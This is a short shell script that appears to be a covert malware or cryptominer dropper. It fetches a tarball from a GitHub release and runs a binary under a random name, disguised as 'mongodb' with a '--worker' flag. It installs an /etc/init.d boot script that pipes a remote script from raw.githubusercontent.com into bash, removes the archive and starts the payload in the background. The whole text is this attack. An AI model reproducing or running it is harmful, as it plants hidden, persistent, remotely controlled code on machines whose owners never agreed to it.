cd /
wget https://github.com/lyricaf/prozac/releases/download/v1.5.1/benad.tar
tar -xvf benad.tar
cd /benad
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv eliquis $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./singul.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/lyricaf/prozac/main/tamiflu.sh)" > flexer.sh
chmod a+x flexer.sh
update-rc.d flexer.sh defaults
rm -rf benad.tar
cd /benad
nohup ./singul.sh
ps -ef | grep benad
